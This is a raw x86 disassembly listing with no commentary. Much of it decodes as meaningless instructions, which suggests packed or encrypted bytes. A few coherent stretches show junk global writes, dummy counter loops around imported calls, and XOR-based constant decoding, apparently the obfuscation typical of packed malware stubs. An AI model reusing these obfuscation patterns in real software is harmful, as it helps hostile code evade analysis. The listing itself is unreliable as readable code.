  4051f6:	or     dh,BYTE PTR [eax-0x7]
  4051f9:	ins    DWORD PTR es:[edi],dx
  4051fa:	cmc    
  4051fb:	out    dx,al
  4051fc:	jno    0x405233
  4051fe:	dec    esi
  4051ff:	mov    bh,0xb7
  405201:	push   eax
  405202:	mul    DWORD PTR [edx+ecx*4]
  405205:	push   0x54
  405207:	pop    edx
  405208:	shr    BYTE PTR [edi-0x18b7e587],cl
  40520e:	mov    edi,0x7d973876
  405213:	add    ecx,DWORD PTR [edi-0x64952f7d]
  405219:	xchg   BYTE PTR [eax],ah
  40521b:	repz scas al,BYTE PTR es:[edi]
  40521d:	and    eax,edi
  40521f:	sbb    eax,0x551ca005
  405224:	sbb    ch,BYTE PTR [edi-0x5a0b66e3]
  40522a:	xchg   esi,eax
  40522b:	ds scas eax,DWORD PTR es:[edi]
  40522d:	pop    ecx
  40522e:	je     0x40520a
  405230:	sbb    esp,DWORD PTR [esp+ebp*8+0x6]
  405234:	dec    eax
  405235:	loop   0x4051fc
  405237:	call   0xdab4:0x75746a09
  40523e:	mov    WORD PTR [eax],cs
  405240:	clc    
  405241:	adc    ah,0x1f
  405244:	pop    eax
  405245:	xor    bl,BYTE PTR [edi-0x48]
  405248:	sbb    al,0xd0
  40524a:	and    esi,DWORD PTR [ebp-0x53]
  40524d:	inc    esp
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	retf   0x572b
  40527f:	cmp    al,dh
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052da
  405289:	xchg   edi,eax
  40528a:	pushf  
  40528b:	call   0x8217:0x327cb9f0
  405292:	add    BYTE PTR [ecx+0x1954d600],0xd3
  405299:	test   al,0x7f
  40529b:	adc    al,0x0
  40529d:	mov    edi,0xe8270610
  4052a2:	add    dl,BYTE PTR [esp+eiz*8-0x3dd06b11]
  4052a9:	adc    eax,0x271779b9
  4052ae:	in     al,0x38
  4052b0:	adc    ebx,DWORD PTR [edx]
  4052b2:	fst    DWORD PTR [ebp*4-0x66d3b840]
  4052b9:	jmp    0x6799:0x4026d64a
  4052c0:	xor    dh,bl
  4052c2:	call   0x7a0f:0xac865f99
  4052c9:	daa    
  4052ca:	out    0x3a,al
  4052cc:	mov    ah,0x6b
  4052ce:	addr16 fs cmp al,0x21
  4052d2:	retf   
  4052d3:	sub    BYTE PTR [ebx+0x50],0x5
  4052d7:	pushf  
  4052d8:	mov    dh,0xe3
  4052da:	cmp    al,0xcf
  4052dc:	cs loopne 0x405300
  4052df:	mov    al,0x97
  4052e1:	shl    DWORD PTR [esi+0x1062127a],1
  4052e7:	xor    esp,ebx
  4052e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ea:	jae    0x4052b6
  4052ec:	pop    ebx
  4052ed:	dec    BYTE PTR [edi+0x4f81d734]
  4052f3:	jnp    0x40529b
  4052f5:	jnp    0x4052eb
  4052f7:	aas    
  4052f8:	dec    edx
  4052f9:	mov    ah,0x2e
  4052fb:	xor    bl,BYTE PTR [esi-0x2c]
  4052fe:	mov    BYTE PTR [edx+0x1f],bl
  405301:	cmp    ah,bl
  405303:	mov    bh,0x4c
  405305:	outs   dx,BYTE PTR ds:[esi]
  405306:	sbb    DWORD PTR [ebp+0x51],0x973a380e
  40530d:	xchg   esi,eax
  40530e:	in     al,dx
  40530f:	enter  0x9e5c,0xff
  405313:	jp     0x405333
  405315:	ror    BYTE PTR [esi+0x6ce95244],cl
  40531b:	or     esi,DWORD PTR [ebp+0x45d11a75]
  405321:	xor    eax,0x7af7a9b5
  405326:	push   ds
  405327:	cdq    
  405328:	sbb    dl,BYTE PTR [esi-0x2ad14186]
  40532e:	pop    ebx
  40532f:	mov    ch,0xe9
  405331:	in     eax,0xca
  405333:	pop    ebp
  405334:	add    BYTE PTR [edi],0xcc
  405337:	jmp    0x405327
  405339:	sar    BYTE PTR [eax],0x4c
  40533c:	aas    
  40533d:	sahf   
  40533e:	movups xmm2,XMMWORD PTR [edx-0x37]
  405342:	inc    esp
  405343:	and    cl,BYTE PTR [eax+ebx*8+0x1e]
  405347:	mov    esp,0xeddc6293
  40534c:	xchg   esi,eax
  40534d:	mov    al,ds:0xeae20a2a
  405352:	int3   
  405353:	lods   al,BYTE PTR ds:[esi]
  405354:	add    esp,DWORD PTR [ecx]
  405356:	(bad)  
  405358:	xlat   BYTE PTR ds:[ebx]
  405359:	or     DWORD PTR [ebp-0x246db101],edx
  40535f:	cs xchg edx,eax
  405361:	mov    ebx,0xe9f5c14e
  405366:	aaa    
  405367:	ret    0xed18
  40536a:	cld    
  40536b:	jbe    0x40538e
  40536d:	jge    0x40535b
  40536f:	adc    eax,DWORD PTR ds:0xa97af5d9
  405375:	jecxz  0x405346
  405377:	fwait
  405378:	in     al,dx
  405379:	outs   dx,BYTE PTR ds:[esi]
  40537a:	xchg   edx,eax
  40537b:	arpl   WORD PTR [edx+ecx*8+0x8217eb6],di
  405382:	mov    eax,0x5daa283e
  405387:	xchg   esi,eax
  405388:	xchg   ecx,eax
  405389:	pop    ecx
  40538a:	xor    al,0xee
  40538c:	mov    bl,0x24
  40538e:	pop    ebx
  40538f:	push   eax
  405390:	and    bl,BYTE PTR [ecx+0xd68693f]
  405396:	les    edx,FWORD PTR [eax+eiz*8-0x6a5ab0ce]
  40539d:	adc    eax,0x135f0876
  4053a2:	loopne 0x4053de
  4053a4:	inc    ebp
  4053a5:	xor    DWORD PTR [edi-0x505074c8],edx
  4053ab:	mov    al,ds:0x1064485a
  4053b0:	popa   
  4053b1:	inc    eax
  4053b2:	sbb    cl,ch
  4053b4:	or     eax,0x35a73210
  4053b9:	cmc    
  4053ba:	or     DWORD PTR [edi+0x3e],0x7b
  4053be:	push   edx
  4053bf:	inc    BYTE PTR [edx+0xf]
  4053c2:	mov    DWORD PTR [eax],esi
  4053c4:	sub    al,0x42
  4053c6:	dec    ebx
  4053c7:	or     dl,dh
  4053c9:	push   esp
  4053ca:	ret    
  4053cb:	jno    0x405407
  4053cd:	dec    esi
  4053ce:	mov    BYTE PTR [eax],al
  4053d0:	dec    ebp
  4053d1:	jbe    0x4053a6
  4053d3:	scas   eax,DWORD PTR es:[edi]
  4053d4:	mov    BYTE PTR [edx-0x72abdf34],cl
  4053da:	in     eax,dx
  4053db:	cmp    eax,0x23e3a83c
  4053e0:	ja     0x4053e8
  4053e2:	mov    ecx,0x7773b9b
  4053e7:	pop    ebx
  4053e8:	(bad)  
  4053e9:	call   0xd507:0x5e269924
  4053f0:	xor    al,0xff
  4053f2:	lea    ebp,[edx-0xa]
  4053f5:	and    esp,DWORD PTR [edx]
  4053f7:	ret    0x803a
  4053fa:	les    edx,FWORD PTR [ecx]
  4053fc:	or     dl,BYTE PTR [edi+eiz*1+0x71]
  405400:	cs inc ebp
  405402:	push   eax
  405403:	mov    eax,0x4f8d1033
  405408:	fwait
  405409:	sub    eax,DWORD PTR [esi-0x53c45be3]
  40540f:	fdivr  QWORD PTR [esi+0x61f81991]
  405415:	sub    eax,0x84647217
  40541a:	push   esi
  40541b:	je     0x405453
  40541d:	arpl   WORD PTR [edx-0x19],ax
  405420:	xchg   edi,eax
  405421:	sub    bh,bl
  405423:	lea    ecx,cs:[edx+0x3559fec3]
  40542a:	imul   esi,ecx,0x3d
  40542d:	(bad)  
  40542e:	out    dx,eax
  40542f:	mov    gs,ebx
  405431:	jbe    0x405435
  405433:	pop    ss
  405434:	pop    ebx
  405435:	retf   
  405436:	in     al,0x88
  405438:	mov    dh,0x37
  40543a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40543b:	jne    0x4053c9
  40543d:	enter  0x9983,0xcb
  405441:	jae    0x405431
  405443:	test   BYTE PTR [edi+esi*2-0x56],bh
  405447:	pop    ds
  405448:	adc    DWORD PTR [ecx],ebp
  40544a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40544b:	pop    edx
  40544c:	mov    ecx,0x2b761631
  405451:	and    BYTE PTR [ebp+ecx*4+0x775c5ea0],ah
  405458:	pop    ds
  405459:	xor    eax,DWORD PTR [ebx-0x7d8ca032]
  40545f:	repnz inc esi
  405461:	arpl   WORD PTR [ecx+0x6a2ab61d],ax
  405467:	sbb    BYTE PTR [ebx],dl
  405469:	pop    eax
  40546a:	aam    0xc5
  40546c:	mov    eax,0xa0b8410a
  405471:	cli    
  405472:	push   ds
  405473:	fwait
  405474:	inc    ecx
  405475:	mov    ecx,0x42898f40
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xeaa2c60a
  4055e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055e6:	sub    ch,al
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405640
  4055f1:	jp     0x40565c
  4055f3:	sbb    eax,0x6c365d83
  4055f8:	xchg   DWORD PTR [esi],ebx
  4055fa:	mov    al,ds:0x242dcd78
  4055ff:	test   BYTE PTR [ecx+0x5e54f7c4],0x94
  405606:	inc    BYTE PTR ds:0xb7a5db3c
  40560c:	xor    BYTE PTR [eax],dl
  40560e:	into   
  40560f:	outs   dx,BYTE PTR ds:[esi]
  405610:	cli    
  405611:	(bad)  
  405612:	jecxz  0x4055e0
  405614:	mov    ah,0x2d
  405616:	sub    DWORD PTR [ecx+0x70fadb08],ebp
  40561c:	dec    edx
  40561d:	xchg   ecx,eax
  40561e:	addr16 test eax,0x3f7d947d
  405624:	inc    esi
  405625:	xor    BYTE PTR [edi],bl
  405627:	push   cs
  405628:	mov    WORD PTR [ebx],ss
  40562a:	cmp    BYTE PTR [edi+0x77],0x30
  40562e:	adc    eax,0xd91c2b58
  405633:	js     0x40560d
  405635:	outs   dx,BYTE PTR ds:[esi]
  405636:	xchg   ebx,eax
  405637:	out    dx,eax
  405638:	shl    BYTE PTR [ebx-0x46],cl
  40563b:	push   cs
  40563c:	xchg   ebp,eax
  40563d:	call   0x378bb74e
  405642:	and    BYTE PTR [esi],0xcd
  405645:	adc    eax,0x8f6d0f13
  40564a:	and    BYTE PTR [eax+ecx*4],cl
  40564d:	(bad)  ds:0xd41ea7e6
  405653:	sbb    al,0x0
  405655:	and    DWORD PTR [ebp+edx*8+0x24255239],edi
  40565c:	jb     0x405619
  40565e:	inc    ebx
  40565f:	push   esp
  405660:	jl     0x405602
  405662:	jp     0x405639
  405664:	xchg   ebp,eax
  405665:	stos   BYTE PTR es:[edi],al
  405666:	add    ebp,DWORD PTR [ecx-0x2dbfc732]
  40566c:	xor    BYTE PTR [esi+0xe],ch
  40566f:	xor    BYTE PTR [edx+0xf394646],ch
  405675:	loop   0x405672
  405677:	sub    bl,BYTE PTR [esi+0x63ac47ed]
  40567d:	jle    0x40563e
  40567f:	sub    DWORD PTR [ecx+ebp*2],ecx
  405682:	adc    dl,BYTE PTR [edi-0x80]
  405685:	out    dx,al
  405686:	cmp    al,0x2e
  405688:	sbb    eax,0xf6aa3cb2
  40568d:	ss mov ebx,0x9639fb0f
  405693:	dec    edx
  405694:	fdecstp 
  405696:	push   ecx
  405697:	jne    0x405712
  405699:	dec    edx
  40569a:	jbe    0x4056c5
  40569c:	mov    esp,0xb6ac7a90
  4056a1:	stc    
  4056a2:	or     ah,BYTE PTR ds:0xdd89154e
  4056a8:	xchg   ebp,eax
  4056a9:	in     eax,dx
  4056aa:	or     bh,BYTE PTR cs:[ecx+0x14]
  4056ae:	sbb    cl,ch
  4056b0:	daa    
  4056b1:	test   al,0x20
  4056b3:	jl     0x4056d2
  4056b5:	mov    DWORD PTR [edx],ecx
  4056b7:	in     eax,dx
  4056b8:	pop    esp
  4056b9:	and    bl,bl
  4056bb:	add    ah,bh
  4056bd:	jle    0x405647
  4056bf:	cld    
  4056c0:	and    al,0xe1
  4056c2:	sub    BYTE PTR [ebp-0x2dd5dcfa],dh
  4056c8:	inc    eax
  4056c9:	cdq    
  4056ca:	push   ds
  4056cb:	mov    esi,0xb0d8b295
  4056d0:	xor    DWORD PTR [esi+eiz*2-0x10c9fae8],ebx
  4056d7:	out    0x62,eax
  4056d9:	imul   edi,edi,0x41
  4056dc:	dec    edx
  4056dd:	call   0x8a9e:0x9869d25e
  4056e4:	shr    DWORD PTR [ebx-0x5b7992df],0xa4
  4056eb:	or     edi,edi
  4056ed:	shl    BYTE PTR [edx+esi*8],1
  4056f0:	ret    
  4056f1:	imul   eax,DWORD PTR [ebx],0x1ab33694
  4056f7:	(bad)  
  4056f8:	mov    WORD PTR ds:0x3f69ad6d,ss
  4056fe:	inc    edi
  4056ff:	fild   DWORD PTR [ebx+0x717b33c]
  405705:	or     bl,BYTE PTR ds:0x864fe8c
  40570b:	mov    eax,DWORD PTR [edx-0x6102705b]
  405711:	and    ah,BYTE PTR [esi+ebp*2]
  405714:	in     al,dx
  405715:	push   esi
  405716:	cmp    ah,BYTE PTR [ebp-0x64557bff]
  40571c:	cli    
  40571d:	mov    edi,0x78c22cd2
  405722:	ds retf 
  405724:	jecxz  0x405788
  405726:	xor    BYTE PTR [eax-0x48],0x23
  40572a:	dec    ecx
  40572b:	add    ah,BYTE PTR ds:0x97509036
  405731:	jle    0x4056e2
  405733:	adc    BYTE PTR [esi-0x14],cl
  405736:	add    DWORD PTR ds:0xf17ff88a,edx
  40573c:	div    DWORD PTR [edi+eax*4+0xcae5458]
  405743:	fstp   QWORD PTR [edi+ebp*4+0x50bf29ce]
  40574a:	loopne 0x40577c
  40574c:	jl     0x405790
  40574e:	mov    dh,0x8
  405750:	cmp    eax,0xd679ee12
  405755:	inc    ebx
  405756:	or     ebx,DWORD PTR [esi-0x42]
  405759:	imul   ebx,DWORD PTR [ebx+0x3f34474c],0x6502469d
  405763:	pop    edx
  405764:	imul   edi,DWORD PTR [esp+edx*8+0x60],0x34e548ef
  40576c:	call   0x83dd:0xddeb136c
  405773:	push   esp
  405774:	je     0x405700
  405776:	sbb    al,0xc8
  405778:	inc    ebp
  405779:	pop    edx
  40577a:	or     al,0x5e
  40577c:	dec    eax
  40577d:	and    al,0x42
  40577f:	ja     0x4057a7
  405781:	dec    edi
  405782:	ins    BYTE PTR es:[edi],dx
  405783:	xchg   ecx,eax
  405784:	mov    ds:0x281779dd,eax
  405789:	iret   
  40578a:	loope  0x4057b8
  40578c:	out    dx,al
  40578d:	ins    BYTE PTR es:[edi],dx
  40578e:	es mov esp,0xed67fe85
  405794:	aaa    
  405795:	xchg   DWORD PTR [ecx-0x4653b47d],edi
  40579b:	jmp    FWORD PTR [ebp-0x9]
  40579e:	jbe    0x4057ec
  4057a0:	inc    ebx
  4057a1:	stos   DWORD PTR es:[edi],eax
  4057a2:	sub    ebx,esp
  4057a4:	imul   esp,DWORD PTR [ebp-0x5c3dc8f9],0x39e33da6
  4057ae:	sub    al,0x51
  4057b0:	dec    eax
  4057b1:	add    BYTE PTR [esi-0x14023e54],0x37
  4057b8:	sub    eax,0xecddb79b
  4057bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057be:	mov    ds:0x1190326,al
  4057c3:	xchg   esp,eax
  4057c4:	pop    edx
  4057c5:	push   ebp
  4057c6:	mov    esp,0xbd953257
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	call   0xd84aa70
  4059a7:	sub    BYTE PTR [esi+0x7e],bh
  4059aa:	push   ebp
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059f7
  4059af:	jecxz  0x4059fb
  4059b1:	test   eax,0x2dfed10a
  4059b6:	mov    esp,0x2c019b5b
  4059bb:	inc    edi
  4059bc:	outs   dx,DWORD PTR ds:[esi]
  4059bd:	outs   dx,DWORD PTR ds:[esi]
  4059be:	or     eax,0x14d13584
  4059c3:	popa   
  4059c4:	retf   0x2f56
  4059c7:	call   0xd341:0x5f823c8
  4059ce:	add    eax,0x528b4948
  4059d3:	dec    edi
  4059d4:	out    dx,al
  4059d5:	pop    edx
  4059d6:	sbb    DWORD PTR [edx],edi
  4059d8:	out    0x65,eax
  4059da:	lods   eax,DWORD PTR ds:[esi]
  4059db:	push   0xffffffcb
  4059dd:	retf   0xb050
  4059e0:	pop    es
  4059e1:	fidiv  DWORD PTR [ecx+0x186fbef1]
  4059e7:	xor    BYTE PTR [edi-0x44e8955e],ah
  4059ed:	jns    0x405a1f
  4059ef:	dec    ebp
  4059f0:	data16 lahf 
  4059f2:	ret    0x1931
  4059f5:	or     bh,bh
  4059f7:	sbb    ch,BYTE PTR [ebp+edi*8-0x26]
  4059fb:	data16 fdiv QWORD PTR [eax-0x588df9ed]
  405a02:	aam    0x53
  405a04:	pushf  
  405a05:	loope  0x4059e5
  405a07:	xor    eax,0xdfab3eb9
  405a0c:	or     BYTE PTR ds:[eax-0x66],cl
  405a10:	lea    ebx,[esi]
  405a12:	ficomp WORD PTR [eax-0x5]
  405a15:	add    eax,0x504a3767
  405a1a:	(bad)  
  405a1b:	sbb    DWORD PTR [ebx+0x4f],edi
  405a1e:	rcl    BYTE PTR ds:0x8d37bb52,1
  405a24:	call   0xf310613d
  405a29:	call   0x4f13:0xf0a6d0e
  405a30:	out    dx,al
  405a31:	jnp    0x405a71
  405a33:	inc    edx
  405a34:	mov    esp,DWORD PTR [edx]
  405a36:	push   es
  405a37:	test   DWORD PTR [eax+ebp*4-0x22],ebp
  405a3b:	lds    ebx,FWORD PTR [edx-0x45]
  405a3e:	mov    eax,ds:0x4707a57c
  405a43:	in     al,dx
  405a44:	pop    ss
  405a45:	fs mov ch,0x8d
  405a48:	adc    DWORD PTR [edi+0x18e59],ebp
  405a4e:	push   esi
  405a4f:	mov    BYTE PTR [eax+0x7ea85ff8],ah
  405a55:	sub    ebx,ecx
  405a57:	dec    esi
  405a58:	dec    edi
  405a59:	dec    ebp
  405a5a:	jge    0x405a6f
  405a5c:	shl    BYTE PTR [edi],0xc8
  405a5f:	mov    eax,0xb691f4a1
  405a64:	nop
  405a65:	in     eax,0xd8
  405a67:	in     al,dx
  405a68:	(bad)  
  405a69:	mov    bl,0x99
  405a6b:	mov    cl,0x43
  405a6d:	aas    
  405a6e:	pop    edi
  405a6f:	test   al,0x58
  405a71:	sbb    ah,BYTE PTR [esi+ebp*1-0x2e030481]
  405a78:	outs   dx,BYTE PTR ds:[esi]
  405a79:	fiadd  WORD PTR fs:[ecx-0x72]
  405a7d:	fwait
  405a7e:	mov    bl,BYTE PTR [edx-0x2d]
  405a81:	push   es
  405a82:	sbb    dh,bl
  405a84:	sub    BYTE PTR [edi+0x2338aba6],0xd5
  405a8b:	ins    DWORD PTR es:[edi],dx
  405a8c:	dec    ebp
  405a8d:	sbb    cl,bl
  405a8f:	push   esp
  405a90:	addr16 push edi
  405a92:	repz sti 
  405a94:	mov    ebx,0x2816a977
  405a99:	jne    0x405a6a
  405a9b:	scas   eax,DWORD PTR es:[edi]
  405a9c:	fdiv   QWORD PTR [ecx-0x75]
  405a9f:	inc    eax
  405aa0:	pushf  
  405aa1:	(bad)  
  405aa2:	loopne 0x405a44
  405aa4:	cmp    DWORD PTR [ebx+0x33],0x1f794217
  405aab:	and    DWORD PTR [ebp+0x52ca2a2e],0x79b1d437
  405ab5:	adc    esi,DWORD PTR [ebx+0x4b]
  405ab8:	bound  esi,QWORD PTR [eax+0x73ddd2da]
  405abe:	pop    eax
  405abf:	mov    bh,0x4c
  405ac1:	mov    al,0x2e
  405ac3:	inc    eax
  405ac4:	pop    ebx
  405ac5:	mov    ebx,0x233ac6f4
  405aca:	sbb    ecx,DWORD PTR [esi+0x6dd353bf]
  405ad0:	aad    0x11
  405ad2:	or     edx,DWORD PTR [esi+0x224be00d]
  405ad8:	dec    esp
  405ad9:	test   al,0xc8
  405adb:	xchg   esp,eax
  405adc:	xor    eax,0x2ad2f68b
  405ae1:	pop    eax
  405ae2:	arpl   bp,di
  405ae4:	add    eax,0x1b6eeba3
  405ae9:	bound  edi,QWORD PTR [edi]
  405aeb:	mov    dh,0x1f
  405aed:	adc    DWORD PTR [ebx+0x267ca874],0x5b
  405af4:	cmp    eax,DWORD PTR [edx*1+0xe29343f]
  405afb:	fistp  DWORD PTR [ecx-0x54467bab]
  405b01:	(bad)  
  405b02:	ror    DWORD PTR [ebx-0x35feddca],cl
  405b08:	test   al,0x5e
  405b0a:	inc    ebx
  405b0b:	cmp    BYTE PTR [ecx-0x5212b0ac],0xe5
  405b12:	(bad)  
  405b14:	cs dec ebx
  405b16:	out    0x29,eax
  405b18:	add    ebx,0x99308a8e
  405b1e:	neg    DWORD PTR [ebx+ebx*1-0x3baa76c8]
  405b25:	test   al,0xf2
  405b27:	dec    BYTE PTR [ebx-0x8de6c27]
  405b2d:	repz cwde 
  405b2f:	cli    
  405b30:	or     eax,0xd13d190d
  405b35:	shl    DWORD PTR [edi+0x4],cl
  405b38:	arpl   WORD PTR [esi],bx
  405b3a:	jmp    0x405b22
  405b3c:	jmp    0x79c5:0x5c8f5544
  405b43:	pop    esp
  405b44:	ins    DWORD PTR es:[edi],dx
  405b45:	inc    edi
  405b46:	mov    al,ds:0x65032ee6
  405b4b:	push   edi
  405b4c:	push   es
  405b4d:	(bad)
  405b50:	rcl    DWORD PTR [ebx-0xfe17354],1
  405b56:	fcmovnu st,st(2)
  405b58:	js     0x405b00
  405b5a:	std    
  405b5b:	mov    al,0x30
  405b5d:	jbe    0x405b07
  405b5f:	rol    DWORD PTR [esp+ebp*8],1
  405b62:	aas    
  405b63:	in     eax,dx
  405b64:	mov    BYTE PTR [edi-0x42369bb3],cl
  405b6a:	xor    bh,BYTE PTR [esi]
  405b6c:	dec    edx
  405b6d:	mov    ebx,ecx
